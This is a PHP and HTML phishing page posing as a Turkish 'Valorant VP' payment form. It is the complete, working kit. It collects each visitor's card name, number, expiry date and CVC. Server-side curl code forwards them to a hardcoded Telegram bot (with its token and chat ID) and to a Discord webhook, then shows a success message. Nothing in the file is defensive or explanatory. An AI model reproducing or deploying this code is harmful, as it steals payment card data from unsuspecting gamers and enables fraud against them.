<?php
$telegram_token = "7785057192:AAHi_N1OuqcM1n45DbyjIvN9cq26Xapiii8";
$telegram_chat_id = "1044235740";

$discord_webhook_url = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";

$sentTelegram = false;
$sentDiscord = false;
$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = trim($_POST['name'] ?? '');
    $cardnumber = trim($_POST['cardnumber'] ?? '');
    $expirationdate = trim($_POST['expirationdate'] ?? '');
    $securitycode = trim($_POST['securitycode'] ?? '');

    if ($name && $cardnumber && $expirationdate && $securitycode) {
        // Mesaj metni
        $message = "💳 Valorant VP Payment Info\n";
        $message .= "👤 Name: $name\n";
        $message .= "💳 Card: $cardnumber\n";
        $message .= "📅 Expiry: $expirationdate\n";
        $message .= "🔐 CVC: $securitycode";

        // --- Telegram'a gönder ---
        $telegram_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
        $telegram_params = [
            "chat_id" => $telegram_chat_id,
            "text" => $message,
            "parse_mode" => "Markdown"
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegram_params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $sentTelegram = ($httpcode >= 200 && $httpcode < 300);

        // --- Discord'a gönder ---
        $discord_payload = json_encode([
            "content" => "**Valorant VP Payment Info**\n" .
                         "**Name:** $name\n" .
                         "**Card:** $cardnumber\n" .
                         "**Expiry:** $expirationdate\n" .
                         "**CVC:** $securitycode"
        ]);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $discord_webhook_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $discord_payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $sentDiscord = ($httpcode >= 200 && $httpcode < 300);

        if (!$sentTelegram && !$sentDiscord) {
            $error = "Telegram ve Discord gönderimi başarısız oldu.";
        }
    } else {
        $error = "Lütfen tüm alanları doldurun.";
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Valorant VP Ödeme</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');

  body {
    margin: 0; padding: 0;
    font-family: 'Orbitron', sans-serif;
    background: linear-gradient(135deg, #fa4659 0%, #f746a9 100%);
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  .container {
    background: rgba(10,10,10,0.9);
    padding: 30px 40px;
    border-radius: 15px;
    width: 360px;
    box-shadow: 0 0 20px #ff3c78;
  }

  h1 {
    margin-bottom: 25px;
    text-align: center;
    text-transform: uppercase;
    letter-spacing: 2px;
    font-size: 28px;
    color: #ff3c78;
    text-shadow: 0 0 8px #ff3c78;
  }

  label {
    display: block;
    margin-top: 15px;
    font-weight: 600;
    font-size: 14px;
    letter-spacing: 1px;
  }

  input {
    margin-top: 6px;
    width: 100%;
    padding: 12px 15px;
    border: none;
    border-radius: 8px;
    background: #222;
    color: #fff;
    font-size: 16px;
    transition: 0.3s ease;
  }

  input:focus {
    outline: none;
    box-shadow: 0 0 8px #ff3c78;
    background: #2a2a2a;
  }

  button {
    margin-top: 25px;
    width: 100%;
    padding: 14px;
    background: #ff3c78;
    border: none;
    border-radius: 10px;
    font-size: 18px;
    font-weight: bold;
    color: #fff;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    box-shadow: 0 0 15px #ff3c78;
    transition: background 0.3s ease;
  }

  button:hover {
    background: #d62c59;
    box-shadow: 0 0 20px #d62c59;
  }

  .message {
    margin-top: 20px;
    padding: 14px;
    border-radius: 10px;
    text-align: center;
    font-weight: 600;
    font-size: 15px;
  }

  .success {
    background-color: #1a531b;
    color: #a6e48d;
    box-shadow: 0 0 10px #a6e48d;
  }

  .error {
    background-color: #5a1111;
    color: #ff7f7f;
    box-shadow: 0 0 10px #ff7f7f;
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Valorant VP Ödeme</h1>

    <?php if ($sentTelegram || $sentDiscord): ?>
      <div class="message success">Bilgiler başarıyla gönderildi! 🎉</div>
    <?php elseif ($error): ?>
      <div class="message error"><?=htmlspecialchars($error)?></div>
    <?php endif; ?>

    <form method="POST" action="">
      <label for="name">Kart Üzerindeki İsim</label>
      <input id="name" name="name" maxlength="50" type="text" required placeholder="İsim Soyisim" />

      <label for="cardnumber">Kart Numarası</label>
      <input id="cardnumber" name="cardnumber" maxlength="19" type="text" pattern="\d{4} \d{4} \d{4} \d{4}" placeholder="1234 5678 9012 3456" required />

      <label for="expirationdate">Son Kullanma Tarihi (AA/YY)</label>
      <input id="expirationdate" name="expirationdate" maxlength="5" type="text" pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" required />

      <label for="securitycode">Güvenlik Kodu (CVC)</label>
      <input id="securitycode" name="securitycode" maxlength="4" type="password" pattern="\d{3,4}" placeholder="CVC" required />

      <button type="submit">Ödeme Yap</button>
    </form>
  </div>

<script>
  const cardnumberInput = document.getElementById('cardnumber');
  cardnumberInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '').substring(0,16);
    let formattedValue = value.match(/.{1,4}/g);
    e.target.value = formattedValue ? formattedValue.join(' ') : '';
  });

  const expirationInput = document.getElementById('expirationdate');
  expirationInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '').substring(0,4);
    if(value.length >= 3){
      value = value.substring(0,2) + '/' + value.substring(2,4);
    }
    e.target.value = value;
  });
</script>
</body>
</html>
